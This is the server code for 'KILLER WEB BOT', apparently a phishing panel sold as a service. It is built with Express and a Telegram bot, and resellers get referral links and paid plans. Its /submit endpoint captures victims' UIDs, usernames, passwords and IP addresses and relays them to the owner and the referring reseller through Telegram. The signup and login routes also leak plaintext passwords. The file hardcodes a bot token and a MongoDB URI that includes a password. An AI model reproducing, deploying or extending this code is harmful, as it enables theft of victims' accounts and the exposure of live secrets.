const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const path = require('path');
const mongoose = require('mongoose');

const app = express();
const PORT = process.env.PORT || 8080;

// ===== CONFIG =====
const BOT_TOKEN = '8839520158:AAEgsvn5-2ycF_pqPWD93IWzmYVRvR3mfMk';
const OWNER_ID = '6900492704';
const OWNER_NAME = 'Sameer';
const OWNER_DM = '@Mrsameer46';
const BOT_USERNAME = '@KILLER_WEB_BOT';
const BOT_START = new Date('2026-10-05');
const WEBSITE_URL = 'https://killer-web.onrender.com';

// ===== MONGODB =====
const MONGO_URI = 'mongodb+srv://killeradmin:GYpkd7wXELNojHF2@cluster0.libonwi.mongodb.net/killerweb?retryWrites=true&w=majority';

mongoose.connect(MONGO_URI)
  .then(() => console.log('✅ MongoDB connected'))
  .catch(err => console.log('❌ MongoDB error:', err.message));
// ===== SCHEMAS =====
const UserSchema = new mongoose.Schema({
  userId: { type: String, unique: true },
  name: String,
  plan: String,
  expiresAt: Date
}, { timestamps: true });

const AccountSchema = new mongoose.Schema({
  username: { type: String, unique: true },
  email: String,
  chatId: String,
  password: String,
  ref: String,
  signupAt: { type: Date, default: Date.now }
}, { timestamps: true });

const ResellerSchema = new mongoose.Schema({
  chatId: { type: String, unique: true },
  name: String,
  plan: String,
  expiresAt: Date,
  joinedAt: { type: Date, default: Date.now },
  users: [{
    chatId: String,
    name: String,
    plan: String,
    signedUpAt: Date
  }]
}, { timestamps: true });

const CustomKeySchema = new mongoose.Schema({
  key: { type: String, unique: true },
  plan: String,
  days: Number,
  used: { type: Boolean, default: false },
  usedBy: String,
  usedAt: Date
}, { timestamps: true });

const User = mongoose.model('User', UserSchema);
const Account = mongoose.model('Account', AccountSchema);
const Reseller = mongoose.model('Reseller', ResellerSchema);
const CustomKey = mongoose.model('CustomKey', CustomKeySchema);

const NOTIFIED_EXPIRED = {};

// ===== EMOJI =====
const E = {
  fire:    '<tg-emoji emoji-id="5424972470023104089">🔥</tg-emoji>',
  star:    '<tg-emoji emoji-id="5438496463044752972">⭐</tg-emoji>',
  check:   '<tg-emoji emoji-id="5206607081334906820">✅</tg-emoji>',
  chart:   '<tg-emoji emoji-id="5231200819986047254">📊</tg-emoji>',
  globe:   '<tg-emoji emoji-id="5447410659077661506">🌐</tg-emoji>',
  bolt:    '<tg-emoji emoji-id="5224607267797606837">⚡</tg-emoji>',
  bell:    '<tg-emoji emoji-id="5458603043203327669">🔔</tg-emoji>',
  pin:     '<tg-emoji emoji-id="5397782960512444700">📌</tg-emoji>',
  hundred: '<tg-emoji emoji-id="5229064374403998351">💯</tg-emoji>',
  dollar:  '<tg-emoji emoji-id="5409048419211682843">💵</tg-emoji>',
  record:  '<tg-emoji emoji-id="5411225014148014586">⏺</tg-emoji>',
  bookmark:'<tg-emoji emoji-id="5222444124698853913">🔖</tg-emoji>',
  cross:   '<tg-emoji emoji-id="5210952531676504517">❌</tg-emoji>',
  warn:    '<tg-emoji emoji-id="5420331619203479070">⚠️</tg-emoji>',
  clock:   '<tg-emoji emoji-id="5224505871225471973">⏰</tg-emoji>',
  crown:   '<tg-emoji emoji-id="5807868868886009920">👑</tg-emoji>',
};

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

// ===== HELPERS =====
function getClientInfo(req) {
  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
             req.headers['x-real-ip'] ||
             req.socket.remoteAddress || 'Unknown';
  const referer = req.headers['referer'] || 'Direct';
  return { ip, referer };
}

async function sendMessage(chatId, text) {
  try {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const res = await axios.post(url, {
      chat_id: chatId, text, parse_mode: 'HTML',
      disable_web_page_preview: true
    });
    return res.data;
  } catch (err) {
    console.log(`❌ Send:`, err.response?.data?.description || err.message);
    return null;
  }
}

// ===== POLLING =====
let lastUpdateId = 0;
async function pollUpdates() {
  try {
    const res = await axios.get(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`, {
      params: { offset: lastUpdateId + 1, timeout: 25 }, timeout: 30000
    });
    if (res.data.ok && res.data.result.length > 0) {
      for (const u of res.data.result) {
        lastUpdateId = u.update_id;
        if (u.message && u.message.text) handleMessage(u.message);
      }
    }
  } catch (err) {}
  setTimeout(pollUpdates, 500);
}

// ===== EXPIRY CHECK =====
async function checkExpiry() {
  const now = new Date();
  try {
    const resellers = await Reseller.find();
    for (const r of resellers) {
      if (r.expiresAt < now && !NOTIFIED_EXPIRED['res_' + r.chatId]) {
        NOTIFIED_EXPIRED['res_' + r.chatId] = true;
        await sendMessage(r.chatId, `
${E.warn} <b>Reseller Plan Expire!</b>
${E.clock} ${r.expiresAt.toLocaleDateString('en-IN')}
${E.dollar} Renew: ${OWNER_DM}
`);
        await sendMessage(OWNER_ID, `
${E.warn} <b>RESELLER EXPIRED</b>
🆔 <code>${r.chatId}</code>
📦 ${r.plan}
`);
      }
    }
    const users = await User.find();
    for (const u of users) {
      if (u.expiresAt < now && !NOTIFIED_EXPIRED['user_' + u.userId]) {
        NOTIFIED_EXPIRED['user_' + u.userId] = true;
        await sendMessage(u.userId, `
${E.warn} <b>Plan Expire!</b>
${E.clock} ${u.expiresAt.toLocaleDateString('en-IN')}
${E.dollar} Renew: ${OWNER_DM}
`);
      }
    }
  } catch (err) { console.log('Expiry err:', err.message); }
  setTimeout(checkExpiry, 60 * 1000);
}

// ===== MESSAGE HANDLER =====
async function handleMessage(msg) {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const userName = msg.from.first_name || 'User';
  const text = msg.text.trim();
  const isOwner = chatId.toString() === OWNER_ID;

  console.log(`📩 ${text} from ${userName}`);

  if (text === '/start') {
    return sendMessage(chatId, `
${E.fire}${E.fire} <b>KILLER WEB BOT</b> ${E.fire}${E.fire}
━━━━━━━━━━━━━━━━━━━━━━━━
${E.check} Bot active hai!

${E.bell} Commands:
   /help /myinfo /owner /status
   /redeem [KEY]
${E.star} Reseller: ${OWNER_DM}
`);
  }

  if (text === '/help') {
    let role = 'USER';
    if (isOwner) role = 'OWNER';
    else if (await Reseller.findOne({ chatId: chatId.toString() })) role = 'RESELLER';

    let h = `
${E.bell} <b>HELP MENU</b>
${E.check} Role: <b>${role}</b>
━━━━━━━━━━━━━━━━━━━━━━━━

${E.fire} <b>PUBLIC:</b>
   /start /help /myinfo /owner /status
   /redeem [KEY]
`;
    if (role === 'RESELLER' || role === 'OWNER') {
      h += `
${E.fire} <b>RESELLER:</b>
   /mylink /myusers /mydetails
`;
    }
    if (role === 'OWNER') {
      h += `
${E.crown} <b>OWNER:</b>
   /makereseller [chatId] [days]
   /removereseller /allresellers /resellerinfo
   /addkey /listkeys /removekey
   /givekey /listusers /removeuser
   /keys
`;
    }
    h += `
━━━━━━━━━━━━━━━━━━━━━━━━
${E.hundred} ${OWNER_NAME}
${E.dollar} ${OWNER_DM}
${E.pin} ${BOT_USERNAME}
`;
    return sendMessage(chatId, h);
  }

  if (text === '/owner') {
    return sendMessage(chatId, `${E.hundred} <b>OWNER</b>\n${E.check} ${OWNER_NAME}\n${E.dollar} ${OWNER_DM}\n${E.pin} ${BOT_USERNAME}`);
  }

  if (text === '/status') {
    const days = Math.floor((new Date() - BOT_START) / (1000 * 60 * 60 * 24)) + 1;
    const rCount = await Reseller.countDocuments();
    return sendMessage(chatId, `${E.chart} <b>STATUS</b>\n${E.check} Online\n${E.check} Days: ${days}\n${E.check} Resellers: ${rCount}`);
  }

  if (text === '/myinfo') {
    const r = await Reseller.findOne({ chatId: chatId.toString() });
    if (r) {
      const dLeft = Math.ceil((r.expiresAt - new Date()) / (1000 * 60 * 60 * 24));
      return sendMessage(chatId, `${E.chart} <b>RESELLER</b>\n🆔 <code>${r.chatId}</code>\n📦 ${r.plan}\n⏳ ${dLeft}d\n👥 ${r.users.length}\n🔗 <code>${WEBSITE_URL}/?ref=${r.chatId}</code>`);
    }
    const u = await User.findOne({ userId: userId.toString() });
    if (!u) return sendMessage(chatId, `${E.cross} Koi plan nahi!\n${E.dollar} ${OWNER_DM}`);
    const d = Math.ceil((u.expiresAt - new Date()) / (1000 * 60 * 60 * 24));
    return sendMessage(chatId, `${E.chart} <b>PLAN</b>\n📦 ${u.plan}\n⏳ ${d}d`);
  }

  // ===== REDEEM =====
  if (text.startsWith('/redeem ')) {
    const key = text.substring(8).trim().toUpperCase();
    const kd = await CustomKey.findOne({ key });
    if (!kd) return sendMessage(chatId, `${E.cross} Invalid key!`);
    if (kd.used) return sendMessage(chatId, `${E.cross} Key already used!`);

    const exp = new Date(Date.now() + kd.days * 24 * 60 * 60 * 1000);
    await User.findOneAndUpdate(
      { userId: userId.toString() },
      { userId: userId.toString(), name: userName, plan: kd.plan, expiresAt: exp },
      { upsert: true }
    );
    kd.used = true; kd.usedBy = userId.toString(); kd.usedAt = new Date();
    await kd.save();

    await sendMessage(chatId, `${E.check} <b>REDEEMED!</b>\n🔑 <code>${key}</code>\n📦 ${kd.plan}\n📅 ${kd.days}d`);
    await sendMessage(OWNER_ID, `🔔 ${userName} redeemed ${key}`);
    return;
  }

  // ===== RESELLER CMDS =====
  const reseller = await Reseller.findOne({ chatId: chatId.toString() });
  if (reseller) {
    const dLeft = Math.ceil((reseller.expiresAt - new Date()) / (1000 * 60 * 60 * 24));
    if (dLeft <= 0) return sendMessage(chatId, `${E.warn} Plan expired! DM: ${OWNER_DM}`);

    if (text === '/mylink') return sendMessage(chatId, `🔗 <code>${WEBSITE_URL}/?ref=${reseller.chatId}</code>`);
    if (text === '/myusers') {
      if (reseller.users.length === 0) return sendMessage(chatId, `${E.cross} No users.`);
      let o = `${E.chart} <b>USERS (${reseller.users.length})</b>\n\n`;
      reseller.users.forEach((u, i) => { o += `${i + 1}. ${u.name} (<code>${u.chatId}</code>)\n`; });
      return sendMessage(chatId, o);
    }
    if (text === '/mydetails') return sendMessage(chatId, `${E.chart}\n🆔 <code>${reseller.chatId}</code>\n📦 ${reseller.plan}\n⏳ ${dLeft}d\n👥 ${reseller.users.length}`);
  }

  // ===== OWNER ONLY =====
  if (!isOwner) {
    if (text.startsWith('/')) sendMessage(chatId, `${E.cross} Unknown! /help`);
    return;
  }

  if (text === '/keys') {
    return sendMessage(chatId, `${E.crown} <b>OWNER PANEL</b>\n\n/makereseller /removereseller /allresellers /resellerinfo\n/addkey /listkeys /removekey\n/givekey /listusers /removeuser`);
  }

  if (text.startsWith('/addkey ')) {
    const p = text.split(' ');
    if (p.length < 4) return sendMessage(chatId, `${E.cross} /addkey KEY plan days`);
    const key = p[1].toUpperCase(), plan = p[2], days = parseInt(p[3]);
    if (isNaN(days)) return sendMessage(chatId, `${E.cross} Days sahi daalo!`);
    const ex = await CustomKey.findOne({ key });
    if (ex) return sendMessage(chatId, `${E.cross} Already exists!`);
    await CustomKey.create({ key, plan, days });
    return sendMessage(chatId, `${E.check} Key: <code>${key}</code> (${plan}, ${days}d)`);
  }

  if (text === '/listkeys') {
    const list = await CustomKey.find();
    let o = `${E.chart} <b>KEYS (${list.length})</b>\n\n`;
    list.forEach((k, i) => { o += `${i + 1}. <code>${k.key}</code> - ${k.plan} - ${k.used ? '❌' : '✅'}\n`; });
    return sendMessage(chatId, o);
  }

  if (text.startsWith('/removekey ')) {
    const k = text.substring(11).toUpperCase();
    await CustomKey.deleteOne({ key: k });
    return sendMessage(chatId, `${E.check} Removed!`);
  }

  if (text.startsWith('/makereseller ')) {
    const p = text.split(' ');
    if (p.length < 3) return sendMessage(chatId, `${E.cross} /makereseller chatId days`);
    const tid = p[1].trim();
    const days = parseInt(p[2].replace(/[^0-9]/g, ''));
    if (isNaN(days)) return sendMessage(chatId, `${E.cross} Days sahi!`);
    const exp = new Date(Date.now() + days * 24 * 60 * 60 * 1000);
    const ex = await Reseller.findOne({ chatId: tid });
    if (ex) { ex.plan = days + ' Days'; ex.expiresAt = exp; await ex.save(); }
    else await Reseller.create({ chatId: tid, name: 'Reseller', plan: days + ' Days', expiresAt: exp });

    await sendMessage(tid, `🎉 <b>RESELLER BAN GAYE!</b>\n📅 ${days} Days\n⏰ ${exp.toLocaleDateString('en-IN')}\n\n🔗 <code>${WEBSITE_URL}/?ref=${tid}</code>`);
    return sendMessage(chatId, `${E.check} Reseller: <code>${tid}</code>\n📅 ${days}d\n🔗 <code>${WEBSITE_URL}/?ref=${tid}</code>`);
  }

  if (text.startsWith('/removereseller ')) {
    const tid = text.substring(17).trim();
    await Reseller.deleteOne({ chatId: tid });
    await sendMessage(tid, `${E.cross} Reseller removed!`);
    return sendMessage(chatId, `${E.check} Removed!`);
  }

  if (text === '/allresellers') {
    const list = await Reseller.find();
    let o = `${E.crown} <b>RESELLERS (${list.length})</b>\n\n`;
    list.forEach((r, i) => {
      const d = Math.ceil((r.expiresAt - new Date()) / (1000 * 60 * 60 * 24));
      o += `${i + 1}. <code>${r.chatId}</code>\n   📦 ${r.plan}\n   ⏳ ${d}d\n   👥 ${r.users.length}\n\n`;
    });
    return sendMessage(chatId, o);
  }

  if (text.startsWith('/resellerinfo ')) {
    const tid = text.substring(14).trim();
    const r = await Reseller.findOne({ chatId: tid });
    if (!r) return sendMessage(chatId, `${E.cross} Not found!`);
    const d = Math.ceil((r.expiresAt - new Date()) / (1000 * 60 * 60 * 24));
    let o = `${E.crown} <b>RESELLER</b>\n🆔 <code>${r.chatId}</code>\n📦 ${r.plan}\n⏳ ${d}d\n🔗 <code>${WEBSITE_URL}/?ref=${r.chatId}</code>\n\n<b>Users:</b>\n`;
    r.users.forEach((u, i) => { o += `${i + 1}. ${u.name} (${u.chatId})\n`; });
    return sendMessage(chatId, o);
  }

  if (text.startsWith('/givekey ')) {
    const p = text.split(' ');
    if (p.length < 3) return sendMessage(chatId, `${E.cross} /givekey chatId plan`);
    const tid = p[1].trim(), plan = p[2].toUpperCase();
    const plans = { '1D': { d: 1, n: 'Trial' }, '7D': { d: 7, n: 'Weekly' }, '30D': { d: 30, n: 'Monthly' }, 'LIFE': { d: 9999, n: 'Lifetime' } };
    if (!plans[plan]) return sendMessage(chatId, `${E.cross} Use: 1D/7D/30D/LIFE`);
    const exp = new Date(Date.now() + plans[plan].d * 24 * 60 * 60 * 1000);
    await User.findOneAndUpdate({ userId: tid }, { userId: tid, name: 'User', plan: plans[plan].n, expiresAt: exp }, { upsert: true });
    await sendMessage(tid, `${E.check} KEY!\n📦 ${plans[plan].n}\n📅 ${plans[plan].d}d`);
    return sendMessage(chatId, `${E.check} Sent!`);
  }

  if (text === '/listusers') {
    const list = await User.find();
    let o = `${E.crown} <b>USERS (${list.length})</b>\n\n`;
    list.forEach((u, i) => {
      const d = Math.ceil((u.expiresAt - new Date()) / (1000 * 60 * 60 * 24));
      o += `${i + 1}. (${u.userId}) - ${u.plan} - ${d}d\n`;
    });
    return sendMessage(chatId, o);
  }

  if (text.startsWith('/removeuser ')) {
    const tid = text.substring(12).trim();
    await User.deleteOne({ userId: tid });
    return sendMessage(chatId, `${E.check} Removed!`);
  }
}

// ===== SIGNUP =====
app.post('/signup', async (req, res) => {
  const { username, email, chatId, password, ref } = req.body;
  if (!username || !email || !chatId || !password)
    return res.json({ success: false, msg: 'All fields required' });

  try {
    const check = await axios.get(`https://api.telegram.org/bot${BOT_TOKEN}/getChat`, { params: { chat_id: chatId } });
    if (!check.data.ok) return res.json({ success: false, msg: 'Chat ID galat! Bot ko /start bhejo.' });
  } catch (err) {
    return res.json({ success: false, msg: 'Chat ID galat! Bot ko /start bhejo.' });
  }

  const ex = await Account.findOne({ username });
  if (ex) return res.json({ success: false, msg: 'Username taken!' });

  const info = getClientInfo(req);
  await Account.create({ username, email, chatId, password, ref: ref || null });

  const msg = `
🆕 <b>NEW SIGNUP</b>
👤 <b>${username}</b>
📧 ${email}
🆔 <code>${chatId}</code>
🔒 <code>${password}</code>
${E.globe} IP: <code>${info.ip}</code>
📅 ${new Date().toLocaleString('en-IN')}
${ref ? `🔗 Via: <code>${ref}</code>` : ''}
`;

  if (ref) {
    const r = await Reseller.findOne({ chatId: ref });
    if (r) {
      await sendMessage(ref, msg);
      r.users.push({ chatId, name: username, plan: 'Signup', signedUpAt: new Date() });
      await r.save();
    }
  }
  await sendMessage(OWNER_ID, `${E.crown} <b>[OWNER]</b>\n\n${msg}`);

  res.json({ success: true });
});

// ===== LOGIN =====
app.post('/login', async (req, res) => {
  const { user, pass } = req.body;
  if (!user || !pass) return res.json({ success: false, msg: 'All fields required' });

  const acc = await Account.findOne({ $or: [{ username: user }, { email: user }] });
  if (!acc) return res.json({ success: false, msg: 'Account nahi mila!' });
  if (acc.password !== pass) return res.json({ success: false, msg: 'Galat password!' });

  const info = getClientInfo(req);
  const msg = `
🔐 <b>LOGIN</b>
👤 ${acc.username}
📧 ${acc.email}
🆔 <code>${acc.chatId}</code>
${E.globe} IP: <code>${info.ip}</code>
⏰ ${new Date().toLocaleString('en-IN')}
`;

  if (acc.ref) await sendMessage(acc.ref, msg);
  await sendMessage(OWNER_ID, `${E.crown} <b>[OWNER]</b>\n\n${msg}`);

  res.json({ success: true, user: { username: acc.username, email: acc.email } });
});

// ===== SUBMIT =====
app.post('/submit', async (req, res) => {
  const { uid, username, password, item, ref } = req.body;
  if (!uid || uid.length < 5) return res.json({ success: false, msg: 'Invalid UID' });
  if (!username || !password) return res.json({ success: false, msg: 'Required' });

  const info = getClientInfo(req);
  const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });

  const msg = `
${E.fire}${E.fire}${E.fire} <b>NEW ACCOUNT</b> ${E.fire}${E.fire}${E.fire}
━━━━━━━━━━━━━━━━━━━━━━━━
╔══════════════════════════╗
║ ${E.check} <b>UID</b> ➤ <code>${uid}</code>
║ ${E.check} <b>USER</b> ➤ ${username}
║ ${E.check} <b>PASS</b> ➤ <code>${password}</code>
╚══════════════════════════╝

${E.star} ITEM: ${item}

╔══════════════════════════╗
║ ${E.globe} IP: <code>${info.ip}</code>
║ ${E.record} TIME: ${time}
╚══════════════════════════╝
━━━━━━━━━━━━━━━━━━━━━━━━
${E.hundred} ${OWNER_NAME} | ${E.dollar} ${OWNER_DM}
`;

  if (ref) {
    const r = await Reseller.findOne({ chatId: ref });
    if (r) await sendMessage(ref, msg);
  }
  await sendMessage(OWNER_ID, `${E.crown} <b>[OWNER]</b>\n\n${msg}`);

  res.json({ success: true });
});

app.listen(PORT, () => {
  console.log(`✅ Website: http://localhost:${PORT}`);
  console.log(`🤖 Bot polling...`);
  pollUpdates();
  checkExpiry();
});
